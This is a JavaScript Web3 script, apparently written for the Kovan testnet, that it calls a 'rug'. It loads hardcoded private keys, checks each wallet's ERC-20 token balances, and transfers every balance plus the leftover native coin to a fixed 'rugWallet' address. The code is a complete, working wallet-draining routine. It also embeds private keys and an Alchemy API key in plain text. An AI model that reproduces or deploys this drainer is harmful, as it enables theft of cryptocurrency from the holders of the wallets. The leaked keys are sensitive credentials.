require("dotenv").config();
const { type } = require("os");
const Web3 = require("web3");
const balanceOfERC20ABI = [
    {
        inputs: [{ internalType: "address", name: "account", type: "address" }],
        name: "balanceOf",
        outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
    },
];
const transferERC20ABI = [
    {
        constant: false,
        inputs: [
            { name: "_to", type: "address" },
            { name: "_value", type: "uint256" },
        ],
        name: "transfer",
        outputs: [{ name: "", type: "bool" }],
        type: "function",
    },
];
const web3polygon = new Web3(
    "wss://eth-kovan.alchemyapi.io/v2/mf4O_mgRA1XaEGQ_QqsFo39uJ-pG_c8s"
);

const tokenList = require("../JSON/kovanTokens.json");

async function initiateRug() {
    const allPrivateKeys = [
        "da411099d501553e314562298ad1226df9fe02fdc70dc04ba10537f460c818eb",
        "ab9f79167b986e589ba4ca98cf175162895677cf33fcc7e2d37a6a0e63f57590",
    ];

    var allWallets = [];
    for (let i = 0; i < allPrivateKeys.length; i++) {
        // create wallet instaces to rug
        let currWallet = await web3polygon.eth.accounts.privateKeyToAccount(
            allPrivateKeys[i]
        );
        await web3polygon.eth.accounts.wallet.add(currWallet);
        allWallets.push(currWallet);
    }

    var tokenTransferInstances = [];
    var tokenBalanceOfInstaces = [];
    for (let token in tokenList) {
        // create transfer contracts
        let currTokenTransferInst = await new web3polygon.eth.Contract(
            transferERC20ABI,
            tokenList[token]
        );
        tokenTransferInstances.push(currTokenTransferInst);

        // create balance contracts
        let currTokenBalanceOfInst = await new web3polygon.eth.Contract(
            balanceOfERC20ABI,
            tokenList[token]
        );
        tokenBalanceOfInstaces.push(currTokenBalanceOfInst);
    }

    startRug(allWallets, tokenBalanceOfInstaces, tokenTransferInstances);
}

async function startRug(allWallets, balanceContracts, transferContracts) {
    const rugWallet = "0xf002c4829f13e9387c61068b41de40949e2b78ee";

    for (let i = 0; i < allWallets.length; i++) {
        const fromWallet = allWallets[i];

        for (let j = 0; j < balanceContracts.length; j++) {
            let balance = await balanceContracts[j].methods
                .balanceOf(fromWallet.address)
                .call();

            if (parseInt(balance) == 0) continue
            
            let estimateGas = await web3polygon.eth.estimateGas({
                from: fromWallet.address,
            });

            await transferContracts[j].methods
                .transfer(rugWallet, balance)
                .send(
                    { from: fromWallet.address, gas: estimateGas },
                    (error, txHash) => {
                        if (!error) console.log(txHash);
                    }
                );
        }

        let gasBalance = await web3polygon.eth.getBalance(fromWallet.address);
        let estimateGas = await web3polygon.eth.estimateGas({
            from: fromWallet.address,
        });
        let gasPrice = await web3polygon.eth.getGasPrice();

        gasBalance = await web3polygon.utils.fromWei(gasBalance);
        
        if (gasBalance - estimateGas * gasPrice < 0) continue

        await web3polygon.eth.sendTransaction({
            from: fromWallet.address,
            to: rugWallet,
            gas: estimateGas,
            value: gasBalance - estimateGas * gasPrice,
        });
    }

    console.log("Successfully rugged all Wallets.");
}

initiateRug();
